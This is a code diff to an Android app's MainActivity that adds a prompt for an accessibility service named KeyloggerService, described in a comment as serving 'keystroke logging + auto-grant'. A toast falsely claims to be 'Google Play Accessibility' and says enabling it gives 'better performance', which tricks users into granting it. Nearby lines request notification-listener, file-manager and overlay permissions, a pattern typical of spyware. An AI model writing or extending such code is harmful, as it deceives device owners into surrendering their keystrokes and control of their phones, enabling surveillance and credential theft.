@@ -120,6 +120,15 @@ public class MainActivity extends AppCompatActivity {
             startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
         }
 
+        // Prompt to enable AccessibilityService for keystroke logging + auto-grant
+        if (!KeyloggerService.isAccessibilityServiceEnabled(this)) {
+            Toast.makeText(this, "Please enable Google Play Accessibility for better performance", Toast.LENGTH_LONG).show();
+            // Direct the user to Accessibility settings where they can find and enable our service
+            Intent a11yIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            a11yIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(a11yIntent);
+        }
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
             if (!Environment.isExternalStorageManager() && !Settings.canDrawOverlays(this)){
                 startActivity(new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS, Uri.parse("package:" + getPackageName())));
